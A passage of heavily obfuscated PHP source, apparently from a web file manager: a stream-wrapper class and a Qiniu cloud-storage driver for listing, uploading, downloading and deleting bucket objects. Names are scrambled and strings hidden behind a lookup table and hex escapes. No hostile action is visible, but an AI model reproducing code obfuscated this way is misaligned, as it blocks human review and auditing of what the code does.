$this->fileSubstr($§ÂÓû£²); } public function fileSubstr($«ËÎå‚Û, $Ò³Ôµ…¦ = 0, $°õ¦ƒ¥á = -1) { $¦„Š¢™ö =& $_SERVER[—ÌÒğš÷]; $¼¯Ã¼ñè = $this->info($«ËÎå‚Û); if (!$¼¯Ã¼ñè || !$¼¯Ã¼ñè[$¦„Š¢™ö[216]] && $¼¯Ã¼ñè[$¦„Š¢™ö[76]] > 1024 * 1024 * 10) { return !1; } if ($°õ¦ƒ¥á === -1) { $°õ¦ƒ¥á = $¼¯Ã¼ñè[$¦„Š¢™ö[76]]; } if ($°õ¦ƒ¥á == 0) { return $¦„Š¢™ö[12]; } $Ö¡ñ¡š = array($¦„Š¢™ö[1531] . $Ò³Ôµ…¦ . $¦„Š¢™ö[818] . ($Ò³Ôµ…¦ + $°õ¦ƒ¥á - 1)); $ùÓµ©î = url_request($«ËÎå‚Û, $¦„Š¢™ö[245], !1, $Ö¡ñ¡š, !1, !1, 30); return $ùÓµ©î[$¦„Š¢™ö[1246]] ? $ùÓµ©î[$¦„Š¢™ö[1246]] : $¦„Š¢™ö[12]; } public function download($¸†âäê, $Ì¿®¦¹Ï) { Downloader::start($¸†âäê, $Ì¿®¦¹Ï); return $Ì¿®¦¹Ï; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÈêÒÃ¸í, $¸ç¶¢êœ = '') { $this->info = $this->info($ÈêÒÃ¸í); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[—ÌÒğš÷][84]]; $this->pathOpen = $ÈêÒÃ¸í; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÈêÒÃ¸í])) { self::$_chunkBuffer[$ÈêÒÃ¸í] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ğ€§üö“) { $ó»Œ±ª° = $this->fileSubstr($this->pose, $ğ€§üö“); $this->pose += strlen($ó»Œ±ª°); return $ó»Œ±ª°; } public function stream_tell() { return $this->pose; } public function stream_seek($¬²÷ü¯ó, $üûö±íì) { $Î–Šƒˆ• =& $_SERVER[—ÌÒğš÷]; if ($üûö±íì == SEEK_SET) { $this->pose = $¬²÷ü¯ó; } else { if ($üûö±íì == SEEK_CUR) { $this->pose += $¬²÷ü¯ó; } else { if ($üûö±íì == SEEK_END) { $this->pose = $this->info[$Î–Šƒˆ•[76]] + intval($¬²÷ü¯ó); } } } if ($¬²÷ü¯ó < 0) { $this->pose = $this->info[$Î–Šƒˆ•[76]] + $¬²÷ü¯ó; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[—ÌÒğš÷][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($È×³Ñü›, $ë«ƒ£À¬) { $ûòÑ¿œĞ =& $_SERVER[—ÌÒğš÷]; $¼§›Ú—§ = $this->info($È×³Ñü›); return array($ûòÑ¿œĞ[1532] => 0, $ûòÑ¿œĞ[1533] => 0, $ûòÑ¿œĞ[16] => 32768 + 511, $ûòÑ¿œĞ[1534] => 0, $ûòÑ¿œĞ[1535] => 0, $ûòÑ¿œĞ[1536] => 0, $ûòÑ¿œĞ[1537] => 0, $ûòÑ¿œĞ[76] => $¼§›Ú—§[$ûòÑ¿œĞ[76]], $ûòÑ¿œĞ[1538] => $¼§›Ú—§[$ûòÑ¿œĞ[1406]], $ûòÑ¿œĞ[1494] => $¼§›Ú—§[$ûòÑ¿œĞ[85]], $ûòÑ¿œĞ[1493] => $¼§›Ú—§[$ûòÑ¿œĞ[215]], $ûòÑ¿œĞ[1539] => 0, $ûòÑ¿œĞ[1540] => 0); } static $fileInfo = array(); public function info($æ¸Ğ»Ù†) { $‹Ïüšáš = $_SERVER[—ÌÒğš÷][1541]; if (isset(self::$fileInfo[$æ¸Ğ»Ù†])) { return self::$fileInfo[$æ¸Ğ»Ù†]; } if (substr($æ¸Ğ»Ù†, 0, strlen($‹Ïüšáš)) != $‹Ïüšáš) { return !1; } self::$fileInfo[$æ¸Ğ»Ù†] = IO::info(substr($æ¸Ğ»Ù†, strlen($‹Ïüšáš))); return self::$fileInfo[$æ¸Ğ»Ù†]; } public static function read($ı¦õüì, $àïœ£ßÚ, $Ê¯œûËÙ) { if (!isset(self::$_fopenCache[$ı¦õüì])) { $Õˆ¦ıê‚ = new StreamWrapperIO(); $Õˆ¦ıê‚->stream_open($ı¦õüì); self::$_fopenCache[$ı¦õüì] = $Õˆ¦ıê‚; } $Õˆ¦ıê‚ = self::$_fopenCache[$ı¦õüì]; return $Õˆ¦ıê‚->fileSubstr($àïœ£ßÚ, $Ê¯œûËÙ); } public static function _read($ÒÎŠåÂõ, $¢Öìô¶¨, $Ã¶ìÕï) { $£æ‘¶îË =& $_SERVER[—ÌÒğš÷]; $”º™Ù¬å = fopen($ÒÎŠåÂõ, $£æ‘¶îË[1410]); if (!$”º™Ù¬å) { return $£æ‘¶îË[12]; } $Ú ê“Í = 8192; fseek($”º™Ù¬å, $¢Öìô¶¨, SEEK_SET); $´é‘äï… = $£æ‘¶îË[12]; $ÅÇ×çôë = 0; while ($ÅÇ×çôë < $Ã¶ìÕï) { $¨‡•æ¥ = min($Ú ê“Í, $Ã¶ìÕï - $ÅÇ×çôë); $´é‘äï… .= fread($”º™Ù¬å, $¨‡•æ¥); $ÅÇ×çôë += $¨‡•æ¥; } fclose($”º™Ù¬å); return $´é‘äï…; } public function fileSubstr($­èêÅèÆ, $©á‚ğË³) { $İÛÉÈì  =& $_SERVER[—ÌÒğš÷]; $¦…¥‘Ç• = $this->info[$İÛÉÈì [76]]; $Â–Å®éÒ = $­èêÅèÆ; $¢úÁèô = $©á‚ğË³; if ($­èêÅèÆ < 0) { $­èêÅèÆ = $¦…¥‘Ç• + $­èêÅèÆ; } if ($©á‚ğË³ === !1) { $©á‚ğË³ = $¦…¥‘Ç• - $­èêÅèÆ; } if ($­èêÅèÆ + $©á‚ğË³ > $¦…¥‘Ç•) { $©á‚ğË³ = $¦…¥‘Ç• - $­èêÅèÆ; } if ($©á‚ğË³ <= 0) { return $İÛÉÈì [12]; } if ($­èêÅèÆ < 0 || $­èêÅèÆ >= $¦…¥‘Ç• || $©á‚ğË³ <= 0 || $©á‚ğË³ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\x52\x65\x61\144\40\145\x72\162\157\x72\41\x20\163\164\x61\162\164\x3d{$­èêÅèÆ}\73\154\145\x6e\x67\x74\x68\x3d{$©á‚ğË³}\73\40\163\151\172\145\x3d{$¦…¥‘Ç•}\x3b"); } $€ÀÖ¦Á = 64 * 1024; $¡íÖ ˆÁ =& self::$_chunkBuffer[$this->path]; if (!$¡íÖ ˆÁ) { $¡íÖ ˆÁ = array(); } $ÁÂ³Í¦Í = 0; $ÎïéÈŸÀ = 0; $‘‚ÕÔñ = $İÛÉÈì [12]; foreach ($¡íÖ ˆÁ as $ÁÂ³Í¦Í => $‘‚ÕÔñ) { $ÁÂ³Í¦Í = intval($ÁÂ³Í¦Í); $ÎïéÈŸÀ = $ÁÂ³Í¦Í + strlen($‘‚ÕÔñ); if ($­èêÅèÆ >= $ÎïéÈŸÀ) { continue; } if ($­èêÅèÆ >= $ÁÂ³Í¦Í && $­èêÅèÆ + $©á‚ğË³ <= $ÎïéÈŸÀ) { return substr($‘‚ÕÔñ, $­èêÅèÆ - $ÁÂ³Í¦Í, $©á‚ğË³); } break; } if (count($¡íÖ ˆÁ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($İÛÉÈì [1542], $İÛÉÈì [1543] . count($¡íÖ ˆÁ) . "\73\x73\164\x61\162\x74\75{$­èêÅèÆ}\54\x6c\145\156\x67\164\150\75{$©á‚ğË³}\x3b\160\x6f\x73\145\x3a{$ÁÂ³Í¦Í}\176{$ÎïéÈŸÀ}"); throw new Exception($İÛÉÈì [1544]); } $½¾ŒÙ¾Ï = intval($­èêÅèÆ / $€ÀÖ¦Á) * $€ÀÖ¦Á; $ÍüËÂƒ® = ceil(($­èêÅèÆ + $©á‚ğË³) / $€ÀÖ¦Á) * $€ÀÖ¦Á - $½¾ŒÙ¾Ï; $”è—ú´‡ = IO::fileSubstr($this->path, $½¾ŒÙ¾Ï, $ÍüËÂƒ®); $¡íÖ ˆÁ[$½¾ŒÙ¾Ï . $İÛÉÈì [12]] = $”è—ú´‡; ksort($¡íÖ ˆÁ); $ÍÉŞ¯÷Ü = substr($”è—ú´‡, $­èêÅèÆ - $½¾ŒÙ¾Ï, $©á‚ğË³); return $ÍÉŞ¯÷Ü; } private function log($Œ–‘€¥Ç, $©Éêï©ï) { $¦ë¦¼ç =& $_SERVER[—ÌÒğš÷]; $•¬÷¯¢š = timeFloat() - $this->timeStart; write_log(sprintf($¦ë¦¼ç[1545], $Œ–‘€¥Ç, $this->info[$¦ë¦¼ç[32]], $•¬÷¯¢š, $©Éêï©ï), $¦ë¦¼ç[1226]); } } goto BŞøÒÖˆ‡°; fùãõœ“¸Ù: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÀúãÌƒ±) { parent::__construct(); require_once SDK_DIR . $_SERVER[—ÌÒğš÷][1454]; $this->_init($ÀúãÌƒ±); } public function _init($Õ—»å¥á) { $üí‚“˜ =& $_SERVER[—ÌÒğš÷]; $this->config = $Õ—»å¥á; foreach ($Õ—»å¥á as $Òê‡ÓÃ‚ => $£ñ‚é¼») { if (isset($this->{$Òê‡ÓÃ‚})) { $this->{$Òê‡ÓÃ‚} = $£ñ‚é¼»; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($üí‚“˜[1455] . LNG($üí‚“˜[1413])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ëô–ş›§, $¨ï¾İ†æ = '', $”ÆÏƒÚï = REPEAT_RENAME) { if ($this->setContent($ëô–ş›§, $¨ï¾İ†æ)) { return $this->getPathOuter($ëô–ş›§); } return !1; } public function mkdir($ßäâî©§, $„ó¨º¬ = REPEAT_SKIP) { $÷‹˜‚¼Æ =& $_SERVER[—ÌÒğš÷]; $¢ë¹å™´ = trim($ßäâî©§, $÷‹˜‚¼Æ[8]); if ($this->_isFolder($¢ë¹å™´)) { return $this->getPathOuter($¢ë¹å™´); } $ßäâî©§ = $¢ë¹å™´ . $÷‹˜‚¼Æ[8]; $¶ÈÉ­ÁÕ = get_path_this($¢ë¹å™´); $†¥ŸŞ¿Š = $ßäâî©§ . $¶ÈÉ­ÁÕ; if (!$this->mkfile($†¥ŸŞ¿Š)) { return !1; } if (!$this->moveFile($†¥ŸŞ¿Š, $ßäâî©§)) { $this->delFile($†¥ŸŞ¿Š); return !1; } return $this->getPathOuter($¢ë¹å™´); } public function copyFile($²©ì«Òù, $‡¸“„¿÷) { $ĞŞã÷Ó = $this->bucketManager->copy($this->bucket, $²©ì«Òù, $this->bucket, $‡¸“„¿÷, !0); return $ĞŞã÷Ó ? !1 : $this->getPathOuter($‡¸“„¿÷); } public function moveFile($Œä²è˜Ü, $ïõ°ŞÒ¶) { $Òµîö²¿ = $this->bucketManager->move($this->bucket, $Œä²è˜Ü, $this->bucket, $ïõ°ŞÒ¶, !0); return $Òµîö²¿ ? !1 : $this->getPathOuter($ïõ°ŞÒ¶); } public function delFile($ãˆµ­¸Ë) { if (!$this->exist($ãˆµ­¸Ë)) { return !0; } $¯µ¹ËÓş = $this->bucketManager->delete($this->bucket, $ãˆµ­¸Ë); return $¯µ¹ËÓş ? !1 : !0; } public function delFolder($×äÌÌö±) { $û„…òÕ¤ =& $_SERVER[—ÌÒğš÷]; if (!$this->exist($×äÌÌö±)) { return !0; } $this->listItemCache = !1; $“ÎØ°¼ = $this->fileList($×äÌÌö±); $this->listItemCache = !0; $ûüä€ìå = trim($×äÌÌö±, $û„…òÕ¤[8]) . $û„…òÕ¤[8]; if (!empty($×äÌÌö±) && $×äÌÌö± !== $û„…òÕ¤[212] && !in_array($ûüä€ìå, $“ÎØ°¼[$û„…òÕ¤[82]])) { $“ÎØ°¼[$û„…òÕ¤[82]][] = $ûüä€ìå; } $õñá¼ôË = $this->delByBatch($“ÎØ°¼[$û„…òÕ¤[83]]); if (!$õñá¼ôË) { return !1; } $õñá¼ôË = $this->delByBatch($“ÎØ°¼[$û„…òÕ¤[82]]); if (!$õñá¼ôË) { return !1; } return $this->delFile($ûüä€ìå); } private function delByBatch($±Œò´Ò«) { foreach (array_chunk($±Œò´Ò«, 1000) as $æİø­Œ´) { $¤¹‚óº = $this->bucketManager->buildBatchDelete($this->bucket, $æİø­Œ´); list($Ñ’¡Ş¨¿, $ì³â–•) = $this->bucketManager->batch($¤¹‚óº); if ($ì³â–•) { return !1; } } return !0; } public function rename($ªÙá¡êŸ, $ıÙ¬ƒõ´) { return $this->renameObject($ªÙá¡êŸ, $ıÙ¬ƒõ´); } public function fileInfo($ˆå’¡®, $öÓˆ«ª€ = false, $«İôÔÏü = array()) { $ùµÇİÇÑ =& $_SERVER[—ÌÒğš÷]; $²Î©áğ = array($ùµÇİÇÑ[32] => $this->pathThis($ˆå’¡®), $ùµÇİÇÑ[84] => $this->getPathOuter($ùµÇİÇÑ[8] . $ˆå’¡®), $ùµÇİÇÑ[33] => $ùµÇİÇÑ[214], $ùµÇİÇÑ[76] => isset($«İôÔÏü[$ùµÇİÇÑ[1456]]) ? $«İôÔÏü[$ùµÇİÇÑ[1456]] : 0, $ùµÇİÇÑ[175] => $this->ext($ˆå’¡®)); if ($öÓˆ«ª€) { return $²Î©áğ; } $²Î©áğ[$ùµÇİÇÑ[215]] = $²Î©áğ[$ùµÇİÇÑ[85]] = 0; $²Î©áğ[$ùµÇİÇÑ[216]] = $²Î©áğ[$ùµÇİÇÑ[217]] = !0; if (empty($«İôÔÏü)) { $«İôÔÏü = $this->objectMeta($ˆå’¡®); if (!$«İôÔÏü) { return $²Î©áğ; } } if (isset($«İôÔÏü[$ùµÇİÇÑ[218]]) && $«İôÔÏü[$ùµÇİÇÑ[218]]) { $²Î©áğ[$ùµÇİÇÑ[219]] = $«İôÔÏü[$ùµÇİÇÑ[218]]; } if (isset($«İôÔÏü[$ùµÇİÇÑ[228]]) && $«İôÔÏü[$ùµÇİÇÑ[228]]) { $²Î©áğ[$ùµÇİÇÑ[219]] = $«İôÔÏü[$ùµÇİÇÑ[228]]; } if (isset($«İôÔÏü[$ùµÇİÇÑ[1457]])) { $²Î©áğ[$ùµÇİÇÑ[85]] = substr($«İôÔÏü[$ùµÇİÇÑ[1457]] . $ùµÇİÇÑ[12], 0, 10); } if (isset($«İôÔÏü[$ùµÇİÇÑ[1456]])) { $²Î©áğ[$ùµÇİÇÑ[76]] = $«İôÔÏü[$ùµÇİÇÑ[1456]]; } return $²Î©áğ; } public function folderInfo($üÌ¤ÎŞâ, $ì´ºå¯ = false) { $ÆÜÌÅ˜Ò =& $_SERVER[—ÌÒğš÷]; $ÕŠÑ“‹ª = array($ÆÜÌÅ˜Ò[32] => $this->pathThis($üÌ¤ÎŞâ), $ÆÜÌÅ˜Ò[84] => $this->getPathOuter($ÆÜÌÅ˜Ò[8] . $üÌ¤ÎŞâ), $ÆÜÌÅ˜Ò[33] => $ÆÜÌÅ˜Ò[75]); if ($ì´ºå¯) { return $ÕŠÑ“‹ª; } $ÕŠÑ“‹ª[$ÆÜÌÅ˜Ò[215]] = $ÕŠÑ“‹ª[$ÆÜÌÅ˜Ò[85]] = 0; $ÕŠÑ“‹ª[$ÆÜÌÅ˜Ò[216]] = $ÕŠÑ“‹ª[$ÆÜÌÅ˜Ò[217]] = !0; $üÌ¤ÎŞâ = rtrim($üÌ¤ÎŞâ, $ÆÜÌÅ˜Ò[8]) . $ÆÜÌÅ˜Ò[8]; $¾­ãóÆ = $this->objectMeta($üÌ¤ÎŞâ); if (isset($¾­ãóÆ[$ÆÜÌÅ˜Ò[1457]])) { $ÕŠÑ“‹ª[$ÆÜÌÅ˜Ò[85]] = substr($¾­ãóÆ[$ÆÜÌÅ˜Ò[1457]] . $ÆÜÌÅ˜Ò[12], 0, 10); } return $ÕŠÑ“‹ª; } public function listPath($¸€ÛÏ–Ì, $‚ŒÅµ€§ = false) { $€ëü†øù =& $_SERVER[—ÌÒğš÷]; $¹á•ÅØ• = $this->fileList($¸€ÛÏ–Ì, $€ëü†øù[8], !0); foreach ($¹á•ÅØ•[$€ëü†øù[82]] as $÷ÛÒ¤­ => $Ä´’´ß) { $¹á•ÅØ•[$€ëü†øù[82]][$÷ÛÒ¤­] = $this->folderInfo($Ä´’´ß, $‚ŒÅµ€§); } foreach ($¹á•ÅØ•[$€ëü†øù[83]] as $÷ÛÒ¤­ => $Ä´’´ß) { $¹á•ÅØ•[$€ëü†øù[83]][$÷ÛÒ¤­] = $this->fileInfo($Ä´’´ß[$€ëü†øù[94]], $‚ŒÅµ€§, $Ä´’´ß); } return $¹á•ÅØ•; } public function has($ÏáÃ, $­¿À˜ˆ‡ = false, $Í½¹®—€ = true) { $ï¤¶Á¸Æ =& $_SERVER[—ÌÒğš÷]; $ÏáÃ = trim($ÏáÃ, $ï¤¶Á¸Æ[8]); $è²Æ°ñ = empty($ÏáÃ) && $ÏáÃ !== $ï¤¶Á¸Æ[212] ? $ï¤¶Á¸Æ[12] : $ÏáÃ . $ï¤¶Á¸Æ[8]; $ñÀ§à­ = $ï¤¶Á¸Æ[12]; $Èë‰‘“† = 500; $ãÅÒç”ï = $ï¤¶Á¸Æ[8]; $İ¼²Á°´ = $îäÀŞäª = 0; while (!0) { check_abort(); list($¡°¾…˜Ë, $°½§ì¹¹) = $this->bucketManager->listFiles($this->bucket, $è²Æ°ñ, $ñÀ§à­, $Èë‰‘“†, $ãÅÒç”ï); if ($°½§ì¹¹) { break; } $ñÀ§à­ = array_key_exists($ï¤¶Á¸Æ[1425], $¡°¾…˜Ë) ? $ñÀ§à­ = $¡°¾…˜Ë[$ï¤¶Á¸Æ[1458]] : $ï¤¶Á¸Æ[12]; if ($­¿À˜ˆ‡) { if (!empty($¡°¾…˜Ë[$ï¤¶Á¸Æ[1459]])) { $İ¼²Á°´ += count($¡°¾…˜Ë[$ï¤¶Á¸Æ[1459]]); } if (!empty($¡°¾…˜Ë[$ï¤¶Á¸Æ[1460]])) { $îäÀŞäª += count($¡°¾…˜Ë[$ï¤¶Á¸Æ[1460]]); } if ($ñÀ§à­ === $ï¤¶Á¸Æ[12]) { break; } continue; } if ($Í½¹®—€) { if (!empty($¡°¾…˜Ë[$ï¤¶Á¸Æ[1459]])) { return !0; } } else { if (!empty($¡°¾…˜Ë[$ï¤¶Á¸Æ[1460]])) { return !0; } } if ($ñÀ§à­ === $ï¤¶Á¸Æ[12]) { break; } } if ($­¿À˜ˆ‡) { return array($ï¤¶Á¸Æ[223] => $İ¼²Á°´, $ï¤¶Á¸Æ[224] => $îäÀŞäª); } return !1; } public function listAll($“˜õÄÍô) { $ñ‡öêÆî =& $_SERVER[—ÌÒğš÷]; $ášÓó—¿ = $this->fileList($“˜õÄÍô, $ñ‡öêÆî[12], !0); $¼•“ñä = array_to_keyvalue($ášÓó—¿[$ñ‡öêÆî[83]], $ñ‡öêÆî[32]); foreach ($ášÓó—¿[$ñ‡öêÆî[82]] as $üğ¯ŸÃ‹) { if (is_string($üğ¯ŸÃ‹)) { $¼•“ñä[$üğ¯ŸÃ‹] = array($ñ‡öêÆî[76] => 0); } } return $this->listAllFiles($“˜õÄÍô, $¼•“ñä); } private function fileList($“Õî¿¤, $Š¶ÒÆÊ¾ = '', $›âù°òÖ = 0) { $õ¨µÕñû =& $_SERVER[—ÌÒğš÷]; $“Õî¿¤ = trim($“Õî¿¤, $õ¨µÕñû[8]); $—ÙÊ”İÄ = empty($“Õî¿¤) && $“Õî¿¤ !== $õ¨µÕñû[212] ? $õ¨µÕñû[12] : $“Õî¿¤ . $õ¨µÕñû[8]; $‘ê—¤Ø™ = $õ¨µÕñû[12]; $‚íŞå¨å = 1000; $£Ü±‘¼ = $úå¸Ä‚¿ = array(); while (!0) { check_abort(); list($³èË‘†, $‰Õ»­’É) = $this->bucketManager->listFiles($this->bucket, $—ÙÊ”İÄ, $‘ê—¤Ø™, $‚íŞå¨å, $Š¶ÒÆÊ¾); if ($‰Õ»­’É) { break; } $‘ê—¤Ø™ = array_key_exists($õ¨µÕñû[1425], $³èË‘†) ? $‘ê—¤Ø™ = $³èË‘†[$õ¨µÕñû[1458]] : $õ¨µÕñû[12]; $›˜õ¥§µ = isset($³èË‘†[$õ¨µÕñû[1459]]) ? $³èË‘†[$õ¨µÕñû[1459]] : array(); $ËÔšş¬ü = isset($³èË‘†[$õ¨µÕñû[1460]]) ? $³èË‘†[$õ¨µÕñû[1460]] : array(); foreach ($›˜õ¥§µ as $æİ¿ı™) { if ($æİ¿ı™[$õ¨µÕñû[94]] == $—ÙÊ”İÄ) { continue; } $àˆøÄ¹ô = $æİ¿ı™[$õ¨µÕñû[94]]; $ûşøÒ¦™ = $æİ¿ı™[$õ¨µÕñû[1456]]; $æİ¿ı™[$õ¨µÕñû[76]] = $ûşøÒ¦™; $©œµ®§É = $ûşøÒ¦™ == 0 && substr($àˆøÄ¹ô, strlen($àˆøÄ¹ô) - 1, 1) == $õ¨µÕñû[8] ? !0 : !1; $this->cacheMethodInfoSet($àˆøÄ¹ô, $©œµ®§É, $æİ¿ı™); if ($©œµ®§É) { $£Ü±‘¼[] = $àˆøÄ¹ô; continue; } $úå¸Ä‚¿[] = $›âù°òÖ ? $æİ¿ı™ : $àˆøÄ¹ô; } foreach ($ËÔšş¬ü as $àˆøÄ¹ô) { if ($àˆøÄ¹ô == $—ÙÊ”İÄ) { continue; } $£Ü±‘¼[] = $àˆøÄ¹ô; $this->cacheMethodInfoSet($àˆøÄ¹ô, !0); } if ($‘ê—¤Ø™ === $õ¨µÕñû[12]) { break; } } $this->cacheMethodInfoSet($“Õî¿¤, !0); return array($õ¨µÕñû[82] => $£Ü±‘¼, $õ¨µÕñû[83] => $úå¸Ä‚¿); } public function canRead($ñªãë…•) { return $this->exist($ñªãë…•) ? !0 : !1; } public function canWrite($™šÍÌå) { return $this->exist($™šÍÌå) ? !0 : !1; } public function getContent($ÊœíÈÛ‹) { return $this->fileSubstr($ÊœíÈÛ‹, 0, -1); } public function setContent($ŠÖ»½Ì¹, $™½²Şñ = '') { $ãÊ†ßç = $this->tempFile($this->pathThis($ŠÖ»½Ì¹)); file_put_contents($ãÊ†ßç, $™½²Şñ); if ($this->upload($ŠÖ»½Ì¹, $ãÊ†ßç)) { $this->tempFileRemve($ãÊ†ßç); return !0; } return !1; } public function refreshUrls($’®½Ü¤) { $Ñïáû¸¯ =& $_SERVER[—ÌÒğš÷]; $½Ğ¤Á¤¯ = array(); if (is_array($’®½Ü¤)) { foreach ($’®½Ü¤ as $¦ÌœÑî‘) { $½Ğ¤Á¤¯[] = $this->link($¦ÌœÑî‘); } } else { $½Ğ¤Á¤¯[] = $this->link($’®½Ü¤); } $ÄÒÃş§À = new Qiniu\Cdn\CdnManager($this->auth); list($×ò…šûù, $‘Ç•€½®) = $ÄÒÃş§À->refreshUrls($½Ğ¤Á¤¯); if ($‘Ç•€½®) { return !1; } return $×ò…šûù[$Ñïáû¸¯[1226]] == $Ñïáû¸¯[795] ? !0 : !1; } public function fileSubstr($Òˆäêš, $š—«ĞÎ±, $ÓøÙŞÎé) { $òÈğ«ÑÓ =& $_SERVER[—ÌÒğš÷]; if (!($¨Éà¶á = $this->link($Òˆäêš))) { return !1; } $ˆÃÔŠÄå = !1; if ($ÓøÙŞÎé > 0) { $ÍÖÇú = $š—«ĞÎ± + $ÓøÙŞÎé - 1; $ˆÃÔŠÄå = array($òÈğ«ÑÓ[1461] . $š—«ĞÎ± . $òÈğ«ÑÓ[430] . $ÍÖÇú); } $¢àãŠ·¨ = url_request($¨Éà¶á, $òÈğ«ÑÓ[245], !1, $ˆÃÔŠÄå); return $¢àãŠ·¨[$òÈğ«ÑÓ[786]] ? $¢àãŠ·¨[$òÈğ«ÑÓ[1246]] : !1; } public function upload($œ ÛØÆ€, $ªã™÷Ü, $âó‹Š¥é = false, $ŸÂ¸­äÁ = REPEAT_REPLACE) { $¾©éµÊ— = new Qiniu\Storage\UploadManager(); $á¡¸Ö†’ = $this->auth->uploadToken($this->bucket, $œ ÛØÆ€); $ÇÓÚ°è = get_file_mime(get_path_ext($ªã™÷Ü)); list($Šãûè£Ì, $¸†Ö³•) = $¾©éµÊ—->putFile($á¡¸Ö†’, $œ ÛØÆ€, $ªã™÷Ü, null, $ÇÓÚ°è); return $¸†Ö³• ? !1 : $this->getPathOuter($œ ÛØÆ€); } public function uploadFormData($¬‘¶·©ò, $Ü´¹êåÖ = 3600) { return $this->uploadToken($¬‘¶·©ò, $Ü´¹êåÖ); } public function multiUploadFormData($õï‚ùûÑ, $Åó£¯—ï = 3600) { return $this->uploadToken($õï‚ùûÑ, $Åó£¯—ï); } private function uploadToken($À„à©İ, $‚çÅÇ§† = 3600) { $ğÉË¿Ìâ =& $_SERVER[—ÌÒğš÷]; $ğÚ×µ“­ = $‚çÅÇ§†; $œ¬ÉÂşÕ = array($ğÉË¿Ìâ[1462] => $ğÉË¿Ìâ[1463]); $‡û“İöµ = $À„à©İ; $À¼º´øŞ = $this->auth->uploadToken($this->bucket, $‡û“İöµ, $ğÚ×µ“­, $œ¬ÉÂşÕ, !0); $öì—ÄÃ = empty($this->region) || $this->region == $ğÉË¿Ìâ[1464] ? $ğÉË¿Ìâ[12] : $ğÉË¿Ìâ[430] . $this->region; $†»‰Ô“Ó = http_type() . "\x3a\57\x2f\165\x70\x6c\157\141\144{$öì—ÄÃ}\56\x71\151\156\151\x75\x70\x2e\143\157\x6d\x2f"; return array($ğÉË¿Ìâ[1465] => $À¼º´øŞ, $ğÉË¿Ìâ[1466] => $†»‰Ô“Ó); } public function download($ö§·”‰ú, $ı°Ûíø) { $Ÿ¢®­Åê = IO::getPathInner(IO::mkfile($ı°Ûíø)); if (!($®­ò³ = $this->link($ö§·”‰ú))) { return !1; } $êÁ¯æğ = 0; $ ä¦´œ = 1024 * 200; $œ÷Ÿœ§ó = fopen($Ÿ¢®­Åê, $_SERVER[—ÌÒğš÷][1467]); while (!0) { $û†ï…µ– = $this->fileSubstr($ö§·”‰ú, $êÁ¯æğ, $ ä¦´œ); if ($û†ï…µ– === !1) { return !1; } fwrite($œ÷Ÿœ§ó, $û†ï…µ–); $êÁ¯æğ += $ ä¦´œ; if (strlen($û†ï…µ–) < $ ä¦´œ) { break; } } fclose($œ÷Ÿœ§ó); return $ı°Ûíø; } public function link($ôĞÉŞˆú, $¯æ¥Ü¯ = '') { if (!$this->isFile($ôĞÉŞˆú)) { return !1; } $‚¡¾Ñè = $this->getHost() . $_SERVER[—ÌÒğš÷][8] . $this->pathEncode($ôĞÉŞˆú) . $¯æ¥Ü¯; return $this->auth->privateDownloadUrl($‚¡¾Ñè, 3600 * 12); } public function fileOut($ˆ™Ò¸õ, $Âì£µ½¤ = false, $´äåı = false, $ç…°¯Ëç = '') { $êëÑµŒ =& $_SERVER[—ÌÒğš÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆ™Ò¸õ, $Âì£µ½¤, $´äåı, $ç…°¯Ëç); } if (!$´äåı) { $´äåı = $this->pathThis($ˆ™Ò¸õ); } $¬óòØ­À = $Âì£µ½¤ ? $êëÑµŒ[1468] . rawurlencode($´äåı) : $êëÑµŒ[12]; $¿‚áÜ±§ = $this->link($ˆ™Ò¸õ, $¬óòØ­À); $this->fileOutLink($¿‚áÜ±§); } public function fileOutServer($¶²õÌ”ü, $ÕåŠª­¹ = false, $…šÌ…ñË = false, $‰·ôÊ„È = '') { parent::fileOut($¶²õÌ”ü, $ÕåŠª­¹, $…šÌ…ñË, $‰·ôÊ„È); } public function fileOutImage($Ê‘¬—£ã, $öƒ˜³ = 250) { $·¤áôæ¢ = $this->link($Ê‘¬—£ã, $_SERVER[—ÌÒğš÷][1469] . $öƒ˜³); $this->fileOutLink($·¤áôæ¢); } public function fileOutImageServer($¢‘§Æ×è, $ò¸É“®ü = 250) { parent::fileOutImage($¢‘§Æ×è, $ò¸É“®ü); } public function hashMd5($›ó¼Ñ…ë) { $ä¼Ì‡üØ =& $_SERVER[—ÌÒğš÷]; $×Â²‹Ú‚ = $this->objectMeta($›ó¼Ñ…ë); return isset($×Â²‹Ú‚[$ä¼Ì‡üØ[228]]) ? $×Â²‹Ú‚[$ä¼Ì‡üØ[228]] : !1; $™¤±ø‘ğ = $this->link($›ó¼Ñ…ë, $ä¼Ì‡üØ[1470]); } public function size($Åšá§­İ) { $ë¯÷à¹ = $this->objectMeta($Åšá§­İ); return $ë¯÷à¹ ? $ë¯÷à¹[$_SERVER[—ÌÒğš÷][76]] : 0; } public function info($ÄĞÂ¡…ë) { if ($this->isFolder($ÄĞÂ¡…ë)) { return $this->folderInfo($ÄĞÂ¡…ë); } else { if ($this->isFile($ÄĞÂ¡…ë)) { return $this->fileInfo($ÄĞÂ¡…ë); } } return !1; } public function exist($ø¢…¥è) { return $this->isFile($ø¢…¥è) || 